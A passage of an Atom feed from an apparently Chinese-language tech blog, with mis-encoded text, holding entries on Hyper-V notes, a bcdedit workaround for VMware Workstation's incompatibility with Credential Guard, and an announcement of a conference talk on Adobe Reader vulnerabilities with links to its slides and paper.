      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="https://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Hyper-V on Windows 10 Notes</title>
    <link href="https://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/"/>
    <id>https://programlife.net/2020/05/13/hyper-v-on-windows-10-notes/</id>
    <published>2020-05-13T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«èŠ±äº†ç‚¹æ—¶é—´çœ‹äº†å¾®è½¯å¯¹ Hyper-V çš„ä»‹ç»æ–‡æ¡£ã€Š<a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/" target="_blank" rel="noopener">Hyper-V on Windows 10</a>ã€‹ï¼Œé¡ºä¾¿è®°ç‚¹ç¬”è®°ã€‚</p><a id="more"></a><ul><li><p><strong>About Hyper-V on Windows</strong></p><ul><li><em>Introduction to Hyper-V</em><ul><li>åœ¨ Windows å®¿ä¸»æœºä¸­å¯ç”¨ Hyper-V ä¹‹åï¼Œå®¿ä¸»æœºä¹Ÿä¼šè¿è¡Œåœ¨ Hyper-V ä¹‹ä¸Šï¼ˆå°±åƒ Hyper-V ä¸­åˆ›å»ºçš„è™šæ‹Ÿæœºä¸€æ ·ï¼‰ï¼Œå› æ­¤å®¿ä¸»æœºä¸­æŸäº›å¯¹å®æ—¶æ€§è¦æ±‚è¾ƒé«˜çš„åº”ç”¨ç¨‹åºçš„è¿è¡Œå¯èƒ½ä¼šå—åˆ°ä¸€å®šçš„å½±å“ï¼›ä½†ä¸è™šæ‹Ÿæœºä¸åŒçš„æ˜¯ï¼Œå®¿ä¸»æœºå¯ä»¥ç›´æ¥è®¿é—®æ‰€æœ‰ç¡¬ä»¶èµ„æºã€‚</li></ul></li></ul></li></ul><p><img src="/uploads/202005/hyperv-architecture.png" alt="Hyper-V æ¶æ„å›¾"></p><ul><li><p><strong>Get started with Hyper-V</strong></p><ul><li><p><em>Install Hyper-V</em></p><ul><li>å®‰è£… Hyper-V æœ‰å¤šç§æ–¹å¼ï¼Œåœ¨ <strong>å¯ç”¨æˆ–å…³é—­ Windows åŠŸèƒ½</strong> ä¸­å®‰è£…æ˜¯ä¸€ç§éå¸¸ç®€å•çš„æ–¹å¼ã€‚</li></ul></li><li><p><em>Create a Virtual Machine</em></p><ul><li><p>åœ¨åˆ›å»ºè™šæ‹Ÿæœºæ—¶ä¼šæ¶‰åŠåˆ° Generation çš„æ¦‚å¿µï¼Œå¾®è½¯å»ºè®®åˆ›å»ºäºŒä»£è™šæ‹Ÿæœºï¼›ä¸€ä»£è™šæ‹Ÿæœºæ”¯æŒç»å¤§å¤šæ•°çš„æ“ä½œç³»ç»Ÿï¼ŒäºŒä»£è™šæ‹Ÿæœºæ”¯æŒ Secure Bootï¼ˆä»…æ”¯æŒå®‰è£… 64 ä½æ“ä½œç³»ç»Ÿï¼‰ï¼›è™šæ‹Ÿæœºä¸€æ—¦åˆ›å»ºï¼ŒGeneration ä¾¿ä¸å¯æ›´æ”¹ã€‚</p></li><li><p>Secure Boot ä¼šæ£€æŸ¥ Bootloader çš„ç­¾åä¸»ä½“åœ¨ UEFI æ•°æ®åº“ä¸­æ˜¯å¦å­˜åœ¨ï¼Œéæ³•çš„ Bootloader ä¸ä¼šè¢«è¿è¡Œã€‚</p></li><li><p>å¦‚æœè¦è°ƒè¯•è™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿçš„å†…æ ¸ï¼Œé‚£ä¹ˆéœ€è¦å…ˆç¦ç”¨ Secure Bootï¼Œç„¶åé€šè¿‡ PowerShell å‘½ä»¤ä¸ºè™šæ‹Ÿæœºæ·»åŠ ä¸€ä¸ªä¸²å£ï¼š</p><ul><li><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Set-VMComPort -VMName TestVM <span class="number">1</span> \\.\pipe\TestPipe</span><br></pre></td></tr></table></figure></li></ul></li><li><p>è™šæ‹Ÿæœºé»˜è®¤ä¼šå¼€å¯ <strong>ä½¿ç”¨è‡ªåŠ¨æ£€æŸ¥ç‚¹</strong>ï¼Œå³è‡ªåŠ¨åˆ›å»ºå¿«ç…§åŠŸèƒ½ï¼Œå»ºè®®å…³é—­è¯¥é€‰é¡¹ã€‚</p></li></ul></li><li><p><em>Hyper-V and PowerShell</em></p><ul><li>ä½¿ç”¨ PowerShell å¯ä»¥å¾ˆæ–¹ä¾¿çš„å’Œè™šæ‹Ÿæœºè¿›è¡Œå„ç§äº¤äº’ï¼Œåœ¨ Fuzz çš„æ—¶å€™åº”è¯¥ä¼šæœ‰ç”¨ã€‚</li></ul></li><li><p><em>Share devices with VMs</em></p><ul><li>è™šæ‹Ÿæœºé»˜è®¤ä½¿ç”¨ <strong>å¢å¼ºä¼šè¯</strong> æ¨¡å¼ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥é€šè¿‡ RDP æ¥è®¿é—®è™šæ‹Ÿæœºï¼Œä½“éªŒå’Œä½¿ç”¨è¿œç¨‹æ¡Œé¢æ˜¯ä¸€æ ·çš„ï¼›åœ¨è¯¥æ¨¡å¼ä¸‹ï¼Œè™šæ‹Ÿæœºå’Œå®¿ä¸»æœºä¹‹é—´é»˜è®¤å…±äº«å‰ªè´´æ¿å¹¶æ”¯æŒæ–‡ä»¶æ‹–æ”¾ï¼Œé€šè¿‡è®¾ç½®è¿˜å¯ä»¥å…±äº«éŸ³é¢‘è®¾å¤‡ã€é©±åŠ¨å™¨ã€æ‰“å°æœºç­‰ï¼›å®é™…æµ‹è¯•è¡¨æ˜è¯¥æ¨¡å¼ä¸‹çš„ç”»é¢æ¸…æ™°åº¦æ›´é«˜ï¼ŒUI ä¸ä¼šæœ‰æ¨¡ç³Šçš„æ„Ÿè§‰ã€‚</li></ul></li><li><p><em>Connect with PowerShell Direct</em></p><ul><li>æ”¯æŒåœ¨å®¿ä¸»æœºä¸­é’ˆå¯¹è™šæ‹Ÿæœºæ‰§è¡Œ PowerShell å‘½ä»¤ã€‚</li></ul></li></ul></li><li><p><strong>Nested Virtualization</strong></p><ul><li><p>Hyper-V æ”¯æŒåµŒå¥—è™šæ‹ŸåŒ–ï¼ˆç›®å‰ä»…æ”¯æŒ Intel CPUï¼‰ï¼Œå¯ä½¿ç”¨ PowerShell å‘½ä»¤ä¸ºè™šæ‹Ÿæœºå¯ç”¨è¯¥ç‰¹æ€§ï¼š</p><ul><li><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Set-VMProcessor -VMName &lt;VMName&gt; -ExposeVirtualizationExtensions <span class="literal">$true</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>Hyper-V å¯èƒ½åœ¨æœªæ¥çš„ç‰ˆæœ¬ä¸­å¢åŠ å¯¹ AMD CPU åµŒå¥—è™šæ‹ŸåŒ–çš„æ”¯æŒï¼ˆå‚è€ƒ <a href="https://github.com/MicrosoftDocs/Virtualization-Documentation/issues/1276" target="_blank" rel="noopener">AMD nested virtualization?</a>ï¼‰ã€‚</p></li></ul></li></ul><p>æœªå¯ç”¨åµŒå¥—è™šæ‹ŸåŒ–æ—¶çš„ Hyper-V æ¶æ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hyperv-no-nesting.png" alt="æœªå¯ç”¨åµŒå¥—è™šæ‹ŸåŒ–çš„ Hyper-V æ¶æ„å›¾"></p><p>å¯ç”¨äº†åµŒå¥—è™šæ‹ŸåŒ–ä¹‹åçš„ Hyper-V æ¶æ„å›¾å¦‚ä¸‹ï¼š</p><p><img src="/uploads/202005/hyperv-nesting.png" alt="å¯ç”¨äº†åµŒå¥—è™šæ‹ŸåŒ–çš„ Hyper-V æ¶æ„å›¾"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«èŠ±äº†ç‚¹æ—¶é—´çœ‹äº†å¾®è½¯å¯¹ Hyper-V çš„ä»‹ç»æ–‡æ¡£ã€Š&lt;a href=&quot;https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hyper-V on Windows 10&lt;/a&gt;ã€‹ï¼Œé¡ºä¾¿è®°ç‚¹ç¬”è®°ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
  </entry>
  
  <entry>
    <title>VMware Workstation Incompatible with Device/Credential Guard</title>
    <link href="https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/"/>
    <id>https://programlife.net/2020/05/10/vmware-workstation-incompatible-with-device-credential-guard/</id>
    <published>2020-05-10T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨ Windows ä¸­å¯ç”¨ Hyper-V ä¹‹åï¼ŒVMware Workstation å°±ä¸èƒ½ç”¨äº†ï¼Œä¼šæç¤ºâ€œVMware Workstation ä¸ Device/Credential Guard ä¸å…¼å®¹ã€‚åœ¨ç¦ç”¨ Device/Credential Guard åï¼Œå¯ä»¥è¿è¡Œ VMware Workstationâ€ï¼Œç„¶è€Œç¦ç”¨ Device/Credential Guard å¹¶ä¸èƒ½è§£å†³é—®é¢˜ã€‚</p><a id="more"></a><p><img src="/uploads/202005/vmware-workstation-incompatible-with-device-credential-guard.png" alt="VMware Workstation and Device/Credential Guard are not compatible"></p><p>å¯ç”¨ Hyper-V ä¹‹åï¼ŒåŸæ¥çš„å®¿ä¸»æœºæ“ä½œç³»ç»Ÿå®é™…ä¸Šä¹Ÿå˜æˆäº†ä¸€å°è™šæ‹Ÿæœºï¼Œå³å®¿ä¸»æœºæ“ä½œç³»ç»Ÿæ˜¯è¿è¡Œåœ¨ Hypervisor ä¹‹ä¸Šçš„ï¼Œæ­¤æ—¶å†è¿è¡Œ VMware Workstation <strong><em>å¯èƒ½ä¼šäº§ç”ŸåµŒå¥—è™šæ‹ŸåŒ–</em></strong>ï¼ˆæ­¤ä¸ºçŒœæµ‹ï¼‰ï¼Œè€Œ Hyper-V çš„è™šæ‹Ÿæœºé»˜è®¤æ˜¯æ²¡æœ‰å¼€å¯åµŒå¥—è™šæ‹ŸåŒ–æ”¯æŒçš„ã€‚</p><p>ä¸€ä¸ªå¯è¡Œçš„è§£å†³æ–¹æ³•æ˜¯é€šè¿‡ <code>bcdedit</code> è®¾ç½®ä¸¤å¥—å¯åŠ¨æ–¹æ¡ˆï¼Œä¸€å¥—å¯ç”¨ Hyper-Vï¼Œå¦ä¸€å¥—åˆ™ç¦ç”¨ Hyper-Vï¼ˆè®¾ç½® <code>HypervisorLaunchType</code> ä¸º <code>OFF</code>ï¼‰ä»¥ä¾¿è¿è¡Œ VMware Workstationã€‚</p><p><img src="/uploads/202005/bcdedit-hypervisor-launchtype.png" alt="é€šè¿‡ bcdedit å‚æ•° HypervisorLaunchType ç¦ç”¨ Hyper-V"></p><p>ç›¸å…³å‘½ä»¤æ–‡æœ¬ï¼š</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> &#123;current&#125; description <span class="string">"Windows 10 Hyper-V"</span></span><br><span class="line">bcdedit /copy &#123;current&#125; /d <span class="string">"Winows 10"</span></span><br><span class="line"><span class="comment">// å·²å°†è¯¥é¡¹æˆåŠŸå¤åˆ¶åˆ° &#123;new_guid&#125;</span></span><br><span class="line">bcdedit /<span class="built_in">set</span> &#123;new_guid&#125; HypervisorLaunchType OFF</span><br><span class="line">bcdedit /displayorder &#123;current&#125; &#123;new_guid&#125;</span><br><span class="line">bcdedit /timeout <span class="number">10</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé»˜è®¤è¿›å…¥å¯ç”¨äº† Hyper-V çš„å¯åŠ¨é¡¹ï¼Œç­‰å¾…æ—¶é—´è®¾ç½®ä¸º 10 ç§’é’Ÿã€‚</p><p><strong>2020/05/30 æ›´æ–°</strong></p><p>VMware Workstation 15.5 å·²ç»æ”¯æŒè¿è¡Œåœ¨ Hyper-V æ¨¡å¼ä¸‹äº†ï¼Œè¦æ±‚ Windows è‡³å°‘æ˜¯ Windows 10 20H1 build 19041.264 åŠæ›´æ–°ç‰ˆæœ¬ï¼Œå‚è€ƒ <a href="https://blogs.vmware.com/workstation/2020/05/vmware-workstation-now-supports-hyper-v-mode.html" target="_blank" rel="noopener">VMware Workstation 15.5 Now Supports Host Hyper-V Mode</a> ï¼š</p><blockquote><p><strong>How does VMware Workstation work before version 15.5.5?</strong> </p><p>VMware Workstation traditionally has used a Virtual Machine Monitor (VMM) which operates in privileged mode requiring direct access to the CPU as well as access to the CPUâ€™s built in virtualization support (Intelâ€™s VT-x and AMDâ€™s AMD-V).  When a Windows host enables Virtualization Based Security (â€œ<a href="https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs" target="_blank" rel="noopener">VBS</a>â€œ) features, Windows adds a hypervisor layer based on Hyper-V between the hardware and Windows.  Any attempt to run VMwareâ€™s traditional VMM fails because being inside Hyper-V the VMM no longer has access to the hardwareâ€™s virtualization support.</p><p><strong>Introducing User Level Monitor</strong></p><p>To fix this Hyper-V/Host VBS compatibility issue, VMwareâ€™s platform team re-architected VMwareâ€™s Hypervisor to use Microsoftâ€™s WHP APIs. This means <strong><em>changing our VMM to run at user level\</em></strong> instead of in privileged mode, as well modifying it to use the WHP APIs to manage the execution of a guest instead of using the underlying hardware directly.</p><p><strong>What does this mean to you?</strong></p><p>VMware Workstation/Player can now run when Hyper-V is enabled. You no longer have to choose between running VMware Workstation and Windows features like WSL, Device Guard and Credential Guard. When Hyper-V is enabled, ULM mode will automatically be used so you can run VMware Workstation normally. If you donâ€™t use Hyper-V at all, VMware Workstation is smart enough to detect this and the VMM will be used.</p><p><strong>System Requirements</strong></p><p>To run Workstation/Player using the Windows Hypervisor APIs, the minimum required Windows 10 version is Windows 10 20H1 build 19041.264. VMware Workstation/Player minimum version is 15.5.5.</p></blockquote><p>ä¸çŸ¥é“è¿™ä¸ªæ–°å¼•å…¥çš„ User Level Monitor å¯¹è™šæ‹Ÿæœºçš„æ€§èƒ½æ˜¯å¦æœ‰å½±å“ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨ Windows ä¸­å¯ç”¨ Hyper-V ä¹‹åï¼ŒVMware Workstation å°±ä¸èƒ½ç”¨äº†ï¼Œä¼šæç¤ºâ€œVMware Workstation ä¸ Device/Credential Guard ä¸å…¼å®¹ã€‚åœ¨ç¦ç”¨ Device/Credential Guard åï¼Œå¯ä»¥è¿è¡Œ VMware Workstationâ€ï¼Œç„¶è€Œç¦ç”¨ Device/Credential Guard å¹¶ä¸èƒ½è§£å†³é—®é¢˜ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="https://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="https://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="https://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="https://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Pwning Adobe Reader Multiple Times with Malformed Strings</title>
    <link href="https://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/"/>
    <id>https://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/</id>
    <published>2020-04-29T00:13:37.000Z</published>
    <updated>2024-03-17T02:37:05.616Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æˆ‘åœ¨ HITB Lockdown Livestream ä¸Šå‘è¡¨äº†é¢˜ä¸ºã€Š<strong>Pwning Adobe Reader Multiple Times with Malformed Strings</strong>ã€‹çš„æ¼”è®²ï¼Œè¯¥æ¼”è®²æœ¬æ¥æ˜¯ä¸º HITB 2020 Amsterdam å‡†å¤‡çš„ï¼Œä½†ç”±äºå—ç–«æƒ…å½±å“ï¼Œä¸»åŠæ–¹è¢«è¿«å–æ¶ˆäº†åŸæ¥çš„ä¼šè®®å®‰æ’ï¼Œè½¬è€Œåœ¨ YouTube ä¸Šä¸¾åŠäº†ä¸€æ¬¡å…è´¹çš„åœ¨çº¿ä¼šè®®ã€‚</p><a id="more"></a><p>è¿™æ¬¡çš„è®®é¢˜æ˜¯æˆ‘åœ¨ ZeroNights 2019 ä¸Šçš„æ¼”è®²ã€Š<strong>Two Bytes to Rule Adobe Reader Twice: The Black Magic Behind the Byte Order Mark</strong>ã€‹çš„è¿›ä¸€æ­¥ç ”ç©¶ï¼Œå› æ­¤ä¼šæœ‰æ¥è¿‘ 40% çš„å†…å®¹æ˜¯é‡å¤çš„ã€‚è¿™æ¬¡æ¼”è®²ç²¾ç®€äº†ä¸Šä¸€æ¬¡æ¼”è®²çš„å†…å®¹ï¼Œå¢åŠ äº†å¯¹ Adobe JavaScript å¼•æ“ç›¸å…³æ•°æ®ç»“æ„çš„åˆ†æï¼ŒåŒæ—¶å¢åŠ äº† 2 ä¸ªæ–°çš„å¯åˆ©ç”¨æ¼æ´ï¼›æœ€é‡è¦çš„æ˜¯ï¼Œè¿™æ¬¡æˆ‘èŠ±äº†ä¸å°‘æ—¶é—´å†™äº†ä¸€ç¯‡éå¸¸è¯¦ç»†çš„ Paperï¼Œæ–¹ä¾¿æ„Ÿå…´è¶£çš„åŒå­¦è‡ªè¡Œå¼€å±•æ¼æ´åˆ†æå·¥ä½œã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™æ¬¡æ–°å¢åŠ çš„ 2 ä¸ªæ¼æ´å…¶å®å·²ç»å­˜äº†å¾ˆä¹…äº†ï¼Œè€Œè·ç¦»ä¸Šä¸€æ¬¡æ¼”è®²å·²ç»è¿‡å»äº†å°†è¿‘åŠå¹´çš„æ—¶é—´ï¼Œæ‰€ä»¥å¦‚æœæœ‰äººè®¤çœŸç ”ç©¶äº†æˆ‘ä¸Šä¸€æ¬¡æ¼”è®²çš„å†…å®¹çš„è¯ï¼Œå‘ç°è¿™ 2 ä¸ªæ¼æ´ä¹Ÿä¸æ˜¯ä»€ä¹ˆéš¾äº‹ :-)</p><p>è®®é¢˜æ–‡æ¡£ï¼š</p><ul><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_slides.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Slides</a></li><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_whitepaper.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Paper</a></li></ul><p><img src="/uploads/202004/hitb-livestream.png" alt="HITB Lockdown Livestream æ¼”è®²"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™æ¬¡æˆ‘åœ¨ HITB Lockdown Livestream ä¸Šå‘è¡¨äº†é¢˜ä¸ºã€Š&lt;strong&gt;Pwning Adobe Reader Multiple Times with Malformed Strings&lt;/strong&gt;ã€‹çš„æ¼”è®²ï¼Œè¯¥æ¼”è®²æœ¬æ¥æ˜¯ä¸º HITB 2020 Amsterdam å‡†å¤‡çš„ï¼Œä½†ç”±äºå—ç–«æƒ…å½±å“ï¼Œä¸»åŠæ–¹è¢«è¿«å–æ¶ˆäº†åŸæ¥çš„ä¼šè®®å®‰æ’ï¼Œè½¬è€Œåœ¨ YouTube ä¸Šä¸¾åŠäº†ä¸€æ¬¡å…è´¹çš„åœ¨çº¿ä¼šè®®ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="https://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="CVE-2019-7032" scheme="https://programlife.net/tags/CVE-2019-7032/"/>
    
      <category term="CVE-2019-8199" scheme="https://programlife.net/tags/CVE-2019-8199/"/>
    
      <category term="CVE-2020-3804" scheme="https://programlife.net/tags/CVE-2020-3804/"/>
    
      <category term="CVE-2020-3805" scheme="https://programlife.net/tags/CVE-2020-3805/"/>
    
      <category term="PDF" scheme="https://programlife.net/tags/PDF/"/>
    
  </entry>
  
</feed>
